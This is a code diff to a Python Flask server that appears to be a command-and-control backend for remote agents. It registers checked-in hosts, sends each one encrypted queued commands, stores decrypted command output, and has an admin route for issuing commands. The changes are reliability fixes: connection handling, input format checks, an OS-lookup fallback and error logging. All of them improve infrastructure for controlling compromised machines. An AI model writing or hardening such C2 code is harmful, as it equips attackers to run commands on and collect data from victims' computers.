@@ -16,11 +16,13 @@ def query_db(query, args=(), one=False):
     conn = sqlite3.connect(DB_FILE)
     conn.row_factory = sqlite3.Row
     cur = conn.cursor()
-    cur.execute(query, args)
-    rv = cur.fetchall()
-    conn.commit()
-    conn.close()
-    return (rv[0] if rv else None) if one else rv
+    try:
+        cur.execute(query, args)
+        rv = cur.fetchall()
+        conn.commit()
+        return (rv[0] if rv else None) if one else rv
+    finally:
+        conn.close()
 
 def init_db():
     query_db('''CREATE TABLE IF NOT EXISTS agents 
@@ -50,7 +52,6 @@ def checkin():
         query_db("INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?)",
                  (host, request.remote_addr, os_info, time.strftime('%H:%M:%S'), request.headers.get('Host', 'Direct IP')))
 
-        # Pull the oldest task that hasn't been acknowledged by this specific host
         cmd_row = query_db('''
             SELECT * FROM tasks t
             WHERE (t.target_type = 'ALL' OR t.target_type = ? OR t.target_type = ?)
@@ -63,7 +64,7 @@ def checkin():
             query_db("INSERT INTO task_receipts (task_id, hostname) VALUES (?, ?)", (cmd_row['id'], host))
 
         return cipher.encrypt(cmd.encode())
-    except Exception as e:
+    except Exception:
         return "Error", 400
 
 @app.route('/api/stats')
@@ -92,14 +93,23 @@ def api_stats():
 def get_result():
     try:
         decrypted_output = cipher.decrypt(request.data).decode()
-        host, output = decrypted_output.split('|', 1)
-        agent = query_db("SELECT os FROM agents WHERE hostname = ?", (host,), one=True)
-        os_type = "Windows" if agent and "Windows" in agent['os'] else "Linux"
+        if '|' not in decrypted_output: return "Format Error", 400
         
-        query_db("INSERT INTO results VALUES (?, ?, ?, ?, ?)",
+        host, output = decrypted_output.split('|', 1)
+        
+        # Robust OS Lookup
+        agent = query_db("SELECT os FROM agents WHERE hostname = ?", (host,), one=True)
+        if agent:
+            os_type = "Windows" if "Windows" in agent['os'] else "Linux"
+        else:
+            os_type = "Unknown"
+        
+        query_db("INSERT INTO results (id, hostname, os, timestamp, output) VALUES (?, ?, ?, ?, ?)",
                  (str(uuid.uuid4())[:8], host, os_type, time.strftime('%H:%M:%S'), output))
         return "OK", 200
-    except: return "Error", 400
+    except Exception as e:
+        print(f"Result Error: {e}")
+        return "Error", 400
 
 @app.route('/admin/send_cmd', methods=['POST'])
 def send_command():
